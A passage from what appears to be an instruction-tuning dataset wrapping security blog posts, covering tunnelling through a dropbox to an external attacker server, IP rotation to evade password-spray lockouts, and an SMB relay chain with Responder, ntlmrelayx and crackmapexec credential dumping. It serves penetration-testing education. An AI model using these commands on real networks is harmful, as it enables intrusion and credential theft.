RDP client For the User name field you can use username to log in using a local account If using a domain account be sure to include the domain name followed by a backslash e.g intdomain carrie Instead of trying to RDP to the internal network what if we wanted to use an Internet Browser on our Attacker machine as if it was on the internal network This can be done with the following modification to the plink command run from the Attacker system plink -i at.ppk root EXTERNAL_IP -P 5001 -D 9999 -proxycmd plink root EXTERNAL_IP -P 443 -i at.ppk -nc 127.0.0.1 5001 After executing this command configure the browser on the Attacker system to use the socks proxy on localhost 9999 You can do this in Firefox by going to Settings the hamburger menu in the upper right Options search for Proxy and then click Settings next to Configure how Firefox connects to the Internet Make sure that Socks v5 is selected as well as Proxy DNS when using SOCKS v5 Clear out anything listed in the No Proxy for text box then click OK You can now browse the Internal network from a browser on your Attacker system as if the browser was on the Dropbox You could use the FoxyProxy addon to quickly change proxy servers in Firefox and Chrome This is how you would configure this using FoxyProxy Chrome IE and Edge use the System Proxy settings You could change the system proxy to point to your dynamic Socks proxy on port 9999 but you might be sending more traffic to the internal network than just your browser traffic which may be undesirable I recommend using Firefox because it manages its own proxy settings apart from the System proxy Or you can use the Foxyproxy Addon with either Firefox or Chrome to control the proxy directly We have finished out walkthrough using a Windows Attack system and a Linux Dropbox For the next scenario let's swap out the Windows Attacker system for a Linux one as shown in the image below The commands executed on the Dropbox are going to remain the same as in the first scenario The only command this will change is the command executed from the Attacker system From a terminal window on the Attacker system we define our IP addresses EXTERNAL_IP 208.8.8.8TARGET_IP 10.2.2.222 Then execute the following SSH command from the same terminal window ssh -i at.key root 127.0.0.1 -p 5001 -L 3390 TARGET_IP 3389 -J root EXTERNAL_IP 443 Now we have a full communication path from port 3390 on our Attacker machine all the way to port 3389 on our Target server We can use any Linux RDP client to connect to our Target For this example I will use xfreerdp which can be installed with the following command Xfreerdp is recommended over rdesktop because it readily supports NLA sudo apt install freerdp2-x11 To connect to the Target server we simply specify the username and the host we want to connect to and we will be prompted to enter the password for the user xfreerdp u carrie v 127.0.0.1 3390 Remember to include the Active Directory domain name along with the username if you are connecting as a domain user xfreerdp u intdomain carrie v 127.0.0.1 3390 As an alternative to running the long SSH command above we can add the following to our SSH config file root .ssh config on the Attacker system Host external Hostname 208.8.8.8 User root Port 443 IdentityFile .ssh at.key Host dropbox Hostname 127.0.0.1 User root Port 5001 ProxyCommand ssh external -W h p IdentityFile .ssh at.key With our SSH config file in place our command is simplified to the following for forwarding RDP to the Target system ssh -L 3390 TARGET_IP 3389 dropbox Or if we want to create a dynamic Socks proxy use the following command It allows us to use a browser on the Attack machine as if it was on the Target Internal network ssh -D 9999 dropbox This completes our second scenario Now let's switch out the Linux Dropbox with a Windows Dropbox This could be a system we literally put on the Target Internal network or one that already existed that we now have access to execute commands on The drawing below shows the starting point for this scenario First we'll set up a local port listen on 3390 and forward it to our Target on port 3389 Running this command required administrative access which you can get by right-clicking on cmd.exe and selecting run as administrator netsh interface portproxy add v4tov4 listenaddress 127.0.0.1 listenport 3390 connectaddress 10.2.2.222 connectport 3389 Now we have the following piece of the communication channel set up Here are some netsh notes that you might like to know for later but don't run them now To delete the rule we just added change add to delete in the command above To show the proxy rules use the show all command netsh interface portproxy show all And to clear out all of the port proxies use reset netsh interface portproxy reset Now we just need to execute the two commands we learned about earlier to complete the setup one from the Dropbox and one from the Attacker system From the Dropbox run the following commands from the directory containing the at.ppk private key and the plink executable set EXTERNAL_IP 208.8.8.8plink -i at.ppk root EXTERNAL_IP -P 443 -L 5001 127.0.0.1 3390 At this point we have the following pieces of the communication channel in place From the Attacker machine running Linux execute the commands below Note that this assumes the SSH config file root .ssh config described earlier in this tutorial has been created TARGET_IP 10.2.2.222ssh -L 3390 TARGET_IP 3389 dropbox Now we have the full communication path ready to go Finally RDP from the Attacker machine to the Target system The example here uses xfreerdp xfreerdp u intdomain carrie v 127.0.0.1 3390 Alternatively instead of setting up for RDP access we could set up for Browser access This does not require administrative access to run commands on the Windows Dropbox The netsh interface portproxy command is not used in this case From the Attacker system run the following command ssh -D 9999 dropbox Lastly configure your browser to use a Socks proxy on localhost 9999 after running this command Remember for this browsing option we have no need for the netsh interface portproxy command therefore we can browse the Target Internal network without having administrative access to our Windows Dropbox Thank you to Carrie Roberts for another terrific guest blog"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>How To Rotate Your Source IP Address</title>\n<taxonomies>External/Internal, How-To, Informational, Password Spray, Red Team, Red Team Tools, Web App, Bypass IP Filtering, Darin Roberts, Foxy Proxy, IP Rotation, password spray, ProxyCannon, ProxyMesh</taxonomies>\n<creation_date>Tue, 19 Mar 2019 16:56:52 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Darin Roberts IP-Go-Round Source IP Rotation I was on an engagement recently that was blocking my password sprays based on my IP address If I made 3 incorrect requests from my IP I was blocked out from making any other requests for 30 minutes How annoying is that It is a great form of security and it might stop attackers looking for a quick way in But this form of security shouldn't be viewed as a way to stop all password spraying It won't stop a dedicated hacker one really trying to get access to your environment One of the ways to bypass IP filtering is to use rotating source IPs ProxyCannon is an amazing tool for automatically routing your traffic through multiple cloud servers to diversify the source IP addresses of your traffic Thank you _shellIntel Check out this BHIS blog post that walks you through using ProxyCannon in conjunction with Burp Suite ww.blackhillsinfosec.com using-burp-proxycannon However I wanted to find something a little bit easier to use so I did some research and found a service called ProxyMesh It was pretty easy to set up and worked well for rotating source IP addresses during a password spray As part of the plan I signed up for there are two proxy options One is a proxy that has 10 IPs that are based in the US The other option is one that is called open with 8 743 IPs I tested speed and reliability with the open proxy and compared that to the US option ProxyMesh has multiple levels of payment options There is a 30-day free trial after your trial is up you can pay as low as 10 a month for the service Obviously the more you pay the better service you get The information found for this blog was gathered using the 10 a month plan If you buy a better plan your numbers might be different I used two ways to connect to ProxyMesh The first way was the FoxyProxy add-on in Chrome The second way was Burp Suite Pro Both methods work great so depending on what you are trying to do you can set it up either way I will show both methods Open FoxyProxy and set up a new proxy Here are the settings that I have for the open proxy Note that credentials are required in the authentication section Using the other proxy in ProxyMesh is as simple as changing the Hostname from open.proxymesh.com to us-wa.proxymesh.com Now every time I load a web page it looks like the request will be coming from a different IP Here are a couple of samples That is pretty cool However it is very time consuming to run tests hitting the reload button and copying the numbers down By using Burp Suite Pro to run my requests I can more easily track the IPs In order to use Burp I need to configure the proxy settings I intentionally left the destination host blank After it has been added you will see that it put in the wildcard so that all destinations are using the proxy For the first trial using the open proxy I ran trials with a sample size of 100 requests to get my IP address from a simple web request I used the default settings on burp 5 threads not throttled Out of 100 requests I found that 7 failed with either a Bad Request response or a timeout There were also 2 requests that returned a previously used IP These 100 requests took just under 1.5 minutes to complete I ran this same trial a total of 10 times and compiled the following results The IPs that were used more than once Multiples are minimal and don't worry me too much The errors were a little disturbing but it wasn't too much work to sort the results and make those few requests again If it is a problem for you then you might want to think of other options For informational purposes the sample revealed the following countries for the source of the IPs and the number of times it was seen in a sample of 100 requests Note the total does not equal 100 because of errors received Country Source for IP Number of Times Seen United States 25 Russia 10 Thailand 4 Indonesia 4 Unknown 4 Brazil 4 Canada 3 Iran 3 Ukraine 3 South Africa 2 Kenya 2 Germany 2 France 2 Ecuador 2 Colombia 2 Egypt 2 Turkey 1 Taiwan 1 Serbia 1 Republic of Korea 1 Poland 1 Palestine 1 Nigeria 1 Netherlands 1 Malaysia 1 Macedonia 1 Japan 1 Ireland 1 Greece 1 Ghana 1 Cambodia 1 Bosnia and Herzegovina 1 Argentina 1 I changed the settings on the number of threads to 10 to see if that had any impact on the results It appeared that the errors and multiples were similar and the time to complete the requests dropped from 1.5 minutes to around 45 seconds to complete Using more threads didn't appear to affect the stability of the proxy I changed the number of threads to 1 and again the only change was the speed with which the requests processed I then changed my proxy to the other option the US-WA Proxy These results were quite different The 100 requests were much faster completing in about 13 seconds with the default 5 threads and no throttling Because the proxy rotates through 10 IPs all of the IPs were used multiple times The IPs used were duplicated from 6 to 14 times for the 100 requests Also there were no errors returned and each request returned an IP Ultimately I found that this was an easy and inexpensive way to rotate source IPs Remember that engagement I was on that was blocking my password sprays By using ProxyMesh to rotate my IPs I was able to conduct my password spray While blocking multiple login attempts from one IP is a great security feature it should not be relied on to completely mitigate the risk of password spraying Have you found another rotating proxy that works well Let us know and we'll check it out"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>How to Purge Google and Start Over - Part 1</title>\n<taxonomies>Author, Blue Team, General InfoSec Tips & Tricks, How-To, Informational, Mike Felch, Blue Team, cloud, Google, Mike Felch, privacy, Red Team</taxonomies>\n<creation_date>Wed, 27 Mar 2019 16:27:11 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Mike Felch A Tale of Blue Destroying Red Let me start by sharing a story about a fairly recent red team engagement against a highly-secured technical customer that didn't end so well for me Their SOC was well-equipped with sophisticated in-house anomaly detection tools incredible visibility across the organization and a tenacious incident response team They were a Google customer and leveraged G Suite to handle their cloud-based business applications which immediately made me excited I've spent a considerable amount of time researching and learning how to weaponize Google products to target organizations so I immediately had a number of different attack-path ideas ready and started on the journey After my team and I successfully compromised credentials and bypassed two-factor using CredSniper we immediately started laterally pivoting through Google applications looking for the typical company data This is when we first learned about the anomaly detection systems because they were leveraging Google Groups to send distribution emails to technical teams which contained interesting security alerts and crontab command-line logs in the archives Needless to say they were heavily invested in Google technologies which is why this story is important It wasn't long before the customer with the help of Google identified our authentication activity as suspicious Whether it was because of a device that was never seen before a location completely different then all others or because of the combination of heuristics it triggered a set of internal processes that eventually led to verification with the employee and a full-fledged incident We eventually compromised a few other accounts but even with a sophisticated system and an on-edge incident response team they couldn't get inside our OODA loop It turns out the Google Admin API wasn't actually real-time and the logs were delayed by 15 minutes I heard Google made it a priority to fix which gave us enough of a head start to run rampant After the engagement the customer told us they contacted Google's SOC for help evidently they are a large Google customer and over the course of 24 hours they worked in tandem tracking burning and destroying our work I want to take a few moments and note that the detection and coordination between the customer and Google was spot on However sometimes things can go a bit too far As you will see The Power of Collaboration You might be asking yourself why this background story is relevant Within those 24 hours Google SOC was able to track and correlate all my burner accounts phones and API tokens then suspend the accounts This included personal and work accounts Making matters worse they also went ahead and reconciled the indicators of compromise to my work account suspending it citing a violation of the terms and service Our system admin re-enabled it the next day and they re-suspended it while suspending the system admin ability to re-enable it Were they wrong Probably not Would I have done the same thing More than likely Trust me Google's ability to track and correlate accounts is very very good Over the next few days I realized the extent of the damage I missed emails from customers in which Google bounced back I was unable to access any of the resources where my Google account was the authenticated identity my work calendar wasn't accessible leaving me without knowing my daily agenda and I couldn't even burn the down-time watching my YouTube backlog LOL If the fall-out had happened at the organizational account level then that would have meant the entire business could have come to a screeching halt Eventually we were able to work with our customer and Google to resolve the misconceptions and alleged violations of the terms of service but not before I learned a valuable lesson Over the next few weeks my wife and I continually had authentication issues where Google account sessions across all devices would randomly require re-authentication Laptops televisions thermostats tablets and more It may have just been a timing fluke but the reality was unsettling Were our home IP addresses flagged as malicious in Google systems Raising Eyebrows The ability of a technology giant to dominate every facet of my work life with a flip of a switch and at the discretion of their employees could have long-lasting implications within our industry if abused I was informally provided information from the customer that Google SOC gave them links to Beau Bullock and I's calendar event injection research which was the initial access vector This explains that those triaging within Google SOC knew the technique that Black Hills Information Security was a pentesting company that I was a tester at the company and that the origin of the technique was me While the customer provided BHIS with authorization to include third-party accounts in-scope Google doesn't seem to have a transparent pentesting approval process that informs them of activity but they have afforded general approval in their Security and Compliance page under the Penetration Testing section So did Google have enough information to limit the impact on my account Even if they did could they have managed this dilemma in a better way Did I actually violate the Terms of Service After all they did agree that no TOS was violated before reinstating my account but it took an incredible amount of back and forth between all affected parties The only two stipulations in Google's requirements for penetration testing is abiding by the Acceptable Use Policy and that their Google Cloud Terms of Service are not violated Obviously violating anything anywhere can result in a ban of everything everywhere This ambiguity is just one thing that every tester needs to be aware of and hopefully is addressed in the very near future In fact this is an issue that all testers everywhere need to be aware of when testing any cloud-based services We are in uncharted territory in respect to cloud testing Many vendors have a policy that we are never to test their core services Others are much better to work with We are using this series as a cautionary tale to other testers and companies Begging the Question With the rise of de-platforming terms of service violations and vague interpretations what could this mean for the future of personal accounts that violate much more unclear terms of service I'm not waiting to find out Check out part 2 where I systematically de-platform myself by purging Google from every facet of my personal life my family and all of my devices The journey was an incredible undertaking that required extensive research and planning to avoid a number of subtle issues that could result in major headaches How to Purge Google and Start Over Part 2"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>How to Purge Google and Start Over - Part 2</title>\n<taxonomies>Author, Blue Team, General InfoSec Tips & Tricks, How-To, Informational, InfoSec 101, Mike Felch, Blue Team, cloud, Google, Red Team</taxonomies>\n<creation_date>Wed, 27 Mar 2019 16:27:30 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Mike Felch How to Purge Google and Start Over Part 1 Brief Recap In part 1 we discussed a red team engagement that went south when the Google SOC joined forces with the SOC of a customer leading to the dismantling of all our compromised accounts throw-away accounts and even my work account My daily work life was impacted significantly that week and my home internet-connected devices that had Google sessions were regularly reset I learned that I should probably reconsider how my own personal life consolidated all facets with Google and how I could be impacted by the technology giant in the event we didn't see eye to eye in the future While their actions were absolutely merited and I agree the response taken was the safest risk reducer for the incident they encountered it left a lingering and troublesome feeling in me Most people that have known me for any length of time can tell you I've been a die-hard Google fanboy for over 15 years Every smart-phone I've owned ran Android almost every smart-device in my home ran Android or was owned by Google and I was a heavy G Suite user All my files were backed up to Google Drive most of my online accounts used SSO with my Google account as primary all my TOTP 2FA relied on Google Authenticator and my phone number was even Google Voice Needless to say it was a lot to think about Prioritizing Requirements I needed a goal Breaking free from Google-related services and devices was a lofty goal but would it be achievable I decided to also include migrating away from a GSM-based cell phone so I could avoid the attack surface of sim-swapping Quick note while there are lots of links to services and products none of them are referral links and are only used to provide options My goals were No Google Services No GSM Phone Quality Cell-phone Coverage Mobile Device Selection This was much more difficult than I previously considered While there were a number of different mobile OS's around some were no longer supported or just purely bad While some of these are dead or no longer supported I listed them so you don't have to waste time researching The ones I looked into were FireOS Amazon's FirePhone but seems dead PureOS Purism Firefox OS died a while back KaiOS integrated with Google Assistant Ubuntu Touch pretty good alternative LightPhone 2 wasn't released but would have been my 1st pick Windows 10 Mobile end of life this year Blackberry SilentPhone Cryptophone all run Android now iOS I was vehemently against Apple at the time After being extremely discontent with all of the available options I ended up buying an iPhone which combined with a Macbook Pro has truly revolutionized my entire digital life My opposition to Apple wasn't because of its technology I just didn't want to go from one giant to another Multi-Factor Selection While selecting a TOTP 2FA solution is fairly straight forward I wanted to take it a step further and also create a completely separate phone line for SMS-based 2FA While some might consider it in the same category as prepper-level status it definitely creates an extra step for an attacker when targeting backup SMS 2FA implementations There are a number of TOTP options as well as VOIP providers that integrate additional phone numbers using apps I didn't see much difference between most of the options but here are a few I considered TOTP Apps Authy Duo LastPass Authenticator VOIP Providers Cloud Sim Telos OpenPhone Sideline Line2 Email Selection Choosing a new mail provider was a big concern I set out desiring full alias support because I wanted to create unique email addresses for separate categories Communicating with people New Email Social profiles New Email Smart-phone apps New email iCloud New email Banking New email Security-related accounts New email Software licenses New email It probably sounds pretty crazy but using aliases you get the convenience of email consolidation with reduced risk of cross-contamination It helps create isolation for people attempting to connect you and your social accounts and since I don't like my personal data being sold and hate ads I opted to pay for email Could anything be as awesome as Gmail and the G Suite line of products Maybe not but we could definitely satisfy our needs There are a number of mail providers available some I considered are ProtonMail FastMail Office 365 Zoho iCloud I didn't like all my eggs in one basket The email provider I decided to go with was FastMail They have multiple plans available and you can even bring your own domain It has built-in support for syncing contacts and calendars while at the same time file support similar to Google Drive I did have a concern with my mail clients leaking my source IP address in each email header which typically happens when you aren't using a webmail client A friend of mine at a fruit company pointed out that FastMail has an undisclosed SMTP port of 565 that strips the source IP address from all outbound email They also have a decent mobile application which seems to be feature-full Making the Migration There are a number of areas I overlooked when I began the journey so in an effort to create somewhat of a checklist for readers here are some areas to remember Accounts Update all site profiles with new email address Update Slack and other social apps Update other profiles using the email as a backup Phone Migrate phone files and images Reinstall apps on new phone Data Backup G Suite data Backup Google Drive files Import contacts Import calendar events Security Re-sync TOTP Push 2FA token sessions Update profiles using SMS 2FA Account Migration There were a few tricks I used to expedite most of this process The first major win was by using my password manager to maintain track of the accounts I've updated with my new email addresses This was convenient because it helped me make sure I covered all the accounts while also updating the password manager directly Be careful though sometimes password managers don't update email addresses automatically which can get tricky if you are using the family subscription for shared passwords A very few sites didn't allow me to actually update my email address You might want to also consider regenerating API tokens that you rely on for the accounts you updated the email address on I ran into an instance where an API token I used heavily no longer worked after I updated my profile email Phone Migration This was probably one of the most straight-forward migrations I made a simple list of the applications I had on my Android phone and made sure I reinstalled them on my new phone Too bad there isn't an app that would have done this automatically I really liked how Android would automatically sync apps on new devices I purchased I didn't worry about syncing my files to my new phone since they are already backed up and I don't actively need them plus as you will read next I found a new solution for data storage Data Migration Google makes it really easy to download all your account data by visiting oogle.com takeout but I strongly suggest syncing Google Drive separately Large files create major head-aches and if you are a heavy user the longer this process will take The good thing about using Google Takeout is all of your Gmail will be downloaded too The only problem I couldn't find a solution for was exporting my Google Books Most of the books on my bookshelf were uploaded and for some reason the download export feature wasn't available for them anymore For storage I opted to replace my home NAS with a Synology DS218play NAS and Seagate SATA drives then just stored everything locally instead of the cloud I ended up purchasing double the space and running an SHR raid configuration This is similar to a raid 1 configuration except it's a custom Synology raid type that allows mix and match of disk sizes while maintaining typical mirror redundancy in case of disk failure There were numerous reasons for the selection of Synology but this Linux-based OS has a simplified user-interface with some really cool built-in applications from collaboration tools to drop-in replacements for my Google Photos and Google Drive needs Moments and Drive apps You can even backup your Google Drive directly This beast is powerful and full of all kinds of useful applications for syncing data to and from cloud providers for the ultra-paranoid or downloading YouTube videos or Torrents Obviously if you want to still play in the cloud for data there are solutions AWS S3 Azure Storage Digital Ocean Spaces Box.com DropBox Don't forget to import your contacts and calendars to your new provider Most contact apps rely on vCard or have import capabilities so it's fairly simple to do The same with most calendars adopting the vCalendar standard so events universally work between providers I used this opportunity to clear out my old contacts Security Migration Finally let's not forget all of those pesky TOTP token sessions in Google Authenticator and changing your phone number for all the profiles that poorly implement 2FA solutions by only offering SMS You do use 2FA for all your accounts right I opted to go with 2 separate TOTP applications but they are all relatively the same As a pentester and red teamer I regularly encounter scenarios where I have to enroll 2FA during customer engagements Something to consider is separating work and personal TOTP apps for 2FA It's probably not that big of a deal unless you have OCD and prefer things in isolation like me Regarding SMS based 2FA I've heard all the pro-SMS 2FA and anti-SMS 2FA infosec Twitterverse arguments and while some might consider SMS better than nothing I strongly disagree I am extremely against SMS-based 2FA for primary and even backup 2FA In the event you have a profile with only SMS 2FA enabled be sure to update the profiles with your new phone number There is no obvious way to identify which profiles use SMS 2FA unless the SMS messages in your messaging app contain what the code is actually for Google and Microsoft provide a nice little message stating G-xxxxxx is your Google verification code and xxxxxx Use this code for Microsoft verification but it seems a lot of others are just a random SMS with a code shrug If you are interested in a discussion on why I think SMS 2FA is insecure unhealthy and should be eliminated altogether feel free to reach out Wiping and Starting Over Now it's time to delete the Google account since everything is set up migrated and working properly I didn't do this immediately because I was worried I might have missed something Keeping the account for a few weeks but not actively using it turned out to be a great choice because there were a few instances where I needed to access my email which was configured as a backup for other profiles It also gave me peace of mind knowing that I hadn't been actively using it and my transition away from Google was a success While there are a number of Google devices that you may need to wipe I will provide instructions for the ones I used Delete Google Account Factory Reset Android devices Factory Reset Nest Thermostat Factory Reset Google Home Factory Reset Fire TV Fire Stick Factory Reset Moto 360 Watch Remove Google Account from Sony TV For some avoiding Google services is going to be impossible For instance I have to use it for work so how do I get around intentionally giving up my data to Google I decided that isolating where and how I use Google would require compartmentalizing authenticated Google sessions to my work laptop only It creates a little head-ache not having work available on my cell phone but it creates a healthy work-life balance For internet searches I've switched over to DuckDuckGo which happens to be a pretty good alternative Don't forget to notify friends and family of your new contact number I actually skipped this step because I figured there are plenty of ways to get a hold of me in an emergency and in most cases I talk to people frequent enough that they will get my new information eventually Disposable Credit Cards Since diversifying my digital life across emails phone numbers and service providers has proven to be very productive I also started using Privacy.com for online purchases It allows me to connect my bank account then I generate single-use credit cards for each purchase You can also generate merchant-specific cards that have a preset limit for monthly payments This way if a merchant gets breached the stolen credit card is useless If selected you can also spoof the transaction name on your bank statement to avoid your spouse seeing those gift purchases Final Thoughts Aside from the reality that technology giants have inadvertently turned into puppeteers with the power to control behavior and literally listen to every area of our lives there is actually another shadow creeping in the clouds that people know about but often overlook the personal data brokering business This arena is huge and the data they have been collecting buying selling giving and trading is staggering in size despite it being public information By compartmentalizing your digital life you can at least make it much more difficult for those targeting you Oh and I'll just leave this here ww.thecreepyline.com it's worth the watch One last thing an interesting provision in article 17 of the EU GDPR forces technology companies to erase your data when requested They are also required to notify the third-parties they provided your data to so they can follow suit as well If you are a US citizen reading this and were hoping to leverage GDPR then check out the Estonia eResidency program In the meantime US citizens can leverage some recent laws passed in Vermont to identify most of the data brokers selling their data by accessing the Vermont business page selecting the Business Type of Data Broker and searching then selecting the Filing History and Filing Type for opt-out instructions Maybe someone reading this will go through each one and track how to opt-out and make it easily accessible to everyone thanks Bronwen That's it I hope this blog series was useful to you and that your journey at taking back control of your digital life goes smoothly How to Purge Google and Start Over Part 1"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>An SMB Relay Race - How To Exploit LLMNR and SMB Message Signing for Fun and Profit</title>\n<taxonomies>Author, External/Internal, How-To, Informational, Jordan Drysdale, LLMNR, Red Team, exploit, How to, Jordan Drysdale, LLMNR, Red Team, SMB Message Signing</taxonomies>\n<creation_date>Mon, 08 Apr 2019 15:57:50 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Jordan Drysdale This is basically a slight update and rip off of Marcello's work out here yt3bl33d3r.github.io practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html tl dr Zero to DA on an environment through an exposed Outlook Web App OWA and a single factor VPN An overview of the techniques is chopped from further down and the attack summary exists twice in this document Identify network systems that do not require SMB message validation Configure Impacket's NTLMrelayx to target those systems Disable SMB and HTTP request response poisoning in Responder and launch Wait for creds We are approaching the topic of NTLM relay via SMB authentication poisoned reflection with something more in mind We are going to execute this whole thing from zero with nothing but an OWA portal a list of users and a smile LLMNR NBNS NBT-NS what is what and how do we differentiate from the attacker's perspective and the defender's NBT-NS and NBNS are the same thing and operate on UDP 137 and are also known as NetBIOS and WINS These services are flawed by design and allow an easy attack path via response races thus an SMB relay race NBNS NBT-NS heretofore referred to as NBNS is a fallback mechanism for name resolution When a system is unable to identify a destination host IP via standard DNS resolutions the system will broadcast at layer 2 in the OSI MAC destination all F's FF FF FF FF FF FF a request for someone to aid in the IP to hostname mapping process This broadcast packet is contained by the subnet and VLAN boundary This is the moment when an attacker can respond and gain access to credential material If the fallback request was intended to resolve a file server the attacker system can present a response and an authentication challenge in subsequent packets thus gaining access to a victim's hashed or cleartext password in certain situations LLMNR is short for link-layer multicast name resolution and operates almost exactly as described in the long version This name resolution technique is also a fallback mechanism for systems unable to resolve hostname via standard DNS The link layer reference in the name keeps the packet on subnet except in exceptional circumstances including broadcast forwarding and IGMP PIM configurations which are way more common when deploying solutions like remote system imaging or tele-casting The destination MAC address for this request is defined as 01 00 5E 00 00 FC on TCP 5355 The reference to multicast in the protocol defines the destination IP of the resolution request's packet in the multicast reserved space at 224.0.0.252 Similar to NBNS LLMNR requests can be compromised by responding to these requests faster than anyone else Thus the following screenshot from krelkci's blog about turning this off on your network SMB message signing is the process of validating the source of requests against a system's SMB services When SMB message checks are enforced the relay attack is rendered ineffective Via group policy modifications we can effectively eliminate this risk by enabling the Digitally sign communications always setting There have been discussions that this setting can cause an impact to network performance While we have not tested this under controlled circumstances if you are considering whether or not this is a risk worth eliminating you should consider a penetration test from Black Hills Information Security Our consulting team can build a package just right for your needs they stand ready to discuss our service options at consulting blackhillsinfosec.com Now armed with some background knowledge about the protocols let's attack our contrived environment first via OWA in through the VPN on to a Linux box and over to the DCs Attacks start with reconnaissance We are skipping over this today Have fun though and maybe try these against your own organization You will likely be terrified by what you find if you invest some effort Recon-ng theHarvester InSpy Burp and LinkedIn DNSDumpster DNS UltraTools MXToolbox Metadata Tools Credential Harvesting Pastebin Shodan Data brokerage firm reports Acxiom BeenVerified Epsilon Anyway you want something like the following when you are done running recon For us we will download MailSniper from here import it and execute We used the next command to recover a valid domain account As usual if the population is sufficiently large a few hundred users and the password policy is weak 8-10 character minimum recovering credentials is just a matter of time Invoke-PasswordSprayOWA -ExchHostname mail.domain.com -UserList C users.txt -Password Spring2019 -OutFile creds.txt We also went ahead and downloaded the global address list with the following command Get-GlobalAddressList -ExchHostname mail.domain.com -UserName wlabv2 maxine.james -Password Spring2019 -OutFile GAL.txt Next using some interesting hosts we found during DNS recon we were able to access and download a configuration file for our recovered user account And we could authenticate Note the OpenVPN client will display networks to which a profile has access Those networks should be scanned for interesting things Now we run Nmap to find things and score a direct hit nmap -p22 --script ssh-brute.nse --script-args userdb users.lst passdb pass.lst 10.55.100.0 24 The results demonstrate victory and we have recovered the first flag in this environment and landed a host from which we can stage further attacks against the network Let's discuss SMB relay in the context of LLMNR and why this is such an important vulnerability to not overlook in your scan results First the vulnerability is known as SMB Message Signing Disabled to Nessus Because the lab is ours to do with what we will we scanned it There were 36 systems discovered with SMB message integrity validation checks disabled As mentioned in Tenable's vulnerability write-up this vulnerability allows attackers to conduct MiTM attacks against an identified SMB server More specifically this vuln allows an attacker with an inside position to reflect poisoned LLMNR and NBNS request response pairs toward this list of systems When the reflected NetNTLMv2 hashes land on systems where the poisoned requester has sufficient permissions the SAM is dumped and new credentials are unlocked The attack in summary Identify network systems that do not require SMB message validation Configure Impacket's NTLMrelayx to target those systems Disable SMB and HTTP response poisoning in Responder and launch Wait for creds The following screenshot is the result of two commands all that's required for this attack In one window ntlmrelayx.py -t 10.55.100.190 And in the Responder pane remember to set SMB and HTTP to 'Off in the Responder.conf file Responder.py -I eth0 -rdw In a matter of minutes we have the contents of SAM from our targeted system When these vulnerabilities are combined which is more often than not in the wild the results can be devastating In our environment we now steal resting NTLM hashes and begin the crackmapexec-based pillaging crackmapexec smb 10.55.100.0 24 -u winlab -H 5120d0cb0df939e3044c5843e37b2c5f --local --lsa Because why wouldn't we run through an entire subnet and dump LSA As seen below we capture a couple more users one of which turned out to be a DA Well then What can you do to reduce these risks Enforce SMB Message Integrity checks on all systems this is only part of solving this problem via group policy Digitally Sign Communications Always Review network systems and DNS configuration specifically Because LLMNR and NBNS are fallback mechanisms a well-configured DNS infrastructure can reduce the need for name lookups over these weak protocols Update your gold system images to include NBNS set to Disabled Configure group policy preferences that disable NBNS NetBIOS WINS on network adapters Configure a group policy that disables LLMNR Limit user privileges on your network as this attack also relies on the reflected NetNTLMv2 authenticator to have sufficient privileges for SMB login LINKS iki.wireshark.org NetBIOS NBNS n.wikipedia.org wiki Link-Local_Multicast_Name_Resolution logs.technet.microsoft.com josebda 2010 12 01 the-basics-of-smb-signing-covering-both-smb1-and-smb2 ww.blackhillsinfosec.com how-to-disable-llmnr-why-you-want-to ithub.com dafthack MailSniper yt3bl33d3r.github.io practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>How to Weaponize the Yubikey</title>\n<taxonomies>Author, How-To, Informational, Michael Allen, Red Team, How to, Michael Allen, Payload, Red Team, Rubber Ducky, Scan Codes, Teensy, Weaponize, yubikey</taxonomies>\n<creation_date>Thu, 02 May 2019 16:35:59 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
